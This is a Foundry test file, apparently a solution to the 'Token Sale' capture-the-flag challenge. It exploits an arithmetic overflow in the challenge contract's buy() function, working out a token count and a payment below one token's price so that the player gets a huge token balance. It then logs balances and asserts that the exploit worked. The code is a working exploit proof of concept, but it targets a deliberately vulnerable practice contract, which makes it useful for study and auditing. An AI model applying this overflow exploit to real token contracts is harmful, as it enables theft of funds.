// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/tokensalechallenge.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge tokenSale;
    address player = makeAddr("player");
    uint256 constant PRICE_PER_TOKEN = 1e18; // 1 ether

    struct TokenSaleSnapshot {
        uint playerTokens;
        uint tokensSold;
        uint playerETH;
        uint contractETH;
    }

    function setUp() public {
        vm.deal(address(this), 1 ether);
        tokenSale = new TokenSaleChallenge{value: 1 ether}(player);
    }

    function test_buyOverflow() public {
        vm.startPrank(player);
        
        // Exploit parameters
        uint256 numTokens = type(uint256).max / PRICE_PER_TOKEN + 1;
        uint256 remainder = type(uint256).max % PRICE_PER_TOKEN;
        uint256 payment = PRICE_PER_TOKEN - remainder - 1;
        vm.deal(player, payment);

        // Capture initial state
        console2.log("--- BEFORE Trigger ---");
        TokenSaleSnapshot memory before = TokenSaleSnapshot({
            playerTokens: tokenSale.balanceOf(player),
            tokensSold: tokenSale.totalTokensSold(),
            playerETH: player.balance,
            contractETH: address(tokenSale).balance
        });
        console2.log("Player tokens:", before.playerTokens);
        console2.log("Tokens sold:", before.tokensSold);
        console2.log("Player ETH:", before.playerETH);
        console2.log("Contract ETH:", before.contractETH);
        
        // Execute exploit
        console2.log("--- Trigger: Call buy() ---");
        tokenSale.buy{value: payment}(numTokens);
        vm.stopPrank();

        // Capture final state
        console2.log("--- AFTER Trigger ---");
        TokenSaleSnapshot memory afterSnap = TokenSaleSnapshot({
            playerTokens: tokenSale.balanceOf(player),
            tokensSold: tokenSale.totalTokensSold(),
            playerETH: player.balance,
            contractETH: address(tokenSale).balance
        });
        console2.log("Player tokens:", afterSnap.playerTokens);
        console2.log("Tokens sold:", afterSnap.tokensSold);
        console2.log("Player ETH:", afterSnap.playerETH);
        console2.log("Contract ETH:", afterSnap.contractETH);
        
        // Verify delta changes
        console2.log("=== Changes ===");
        require(afterSnap.playerTokens > before.playerTokens, "Tokens not increased");
        uint tokensDelta = afterSnap.playerTokens - before.playerTokens;
        console2.log("Tokens gained:", tokensDelta, "expected", numTokens);
        
        uint tokensSoldDelta = afterSnap.tokensSold - before.tokensSold;
        console2.log("New tokens sold:", tokensSoldDelta, "expected", numTokens);
        
        require(before.playerETH > afterSnap.playerETH, "ETH balance error");
        uint ethLoss = before.playerETH - afterSnap.playerETH;
        console2.log("ETH spent:", ethLoss, "expected", payment);
        
        require(afterSnap.contractETH > before.contractETH, "Contract ETH error");
        uint ethGain = afterSnap.contractETH - before.contractETH;
        console2.log("Contract ETH gained:", ethGain, "expected", payment);

        // Final exploit verification
        if (tokensDelta == numTokens && 
            tokensSoldDelta == numTokens &&
            ethLoss == payment &&
            ethGain == payment &&
            payment < PRICE_PER_TOKEN) 
        {
            console2.log("Vulnerability Exists: Successful overflow exploit");
        } else {
            console2.log("Vulnerability not Exist: State changes mismatch");
        }

        // Maintain existing assertions
        assertEq(afterSnap.playerTokens, numTokens, "Player tokens mismatch");
        assertLt(payment, PRICE_PER_TOKEN, "Invalid payment amount");
    }
}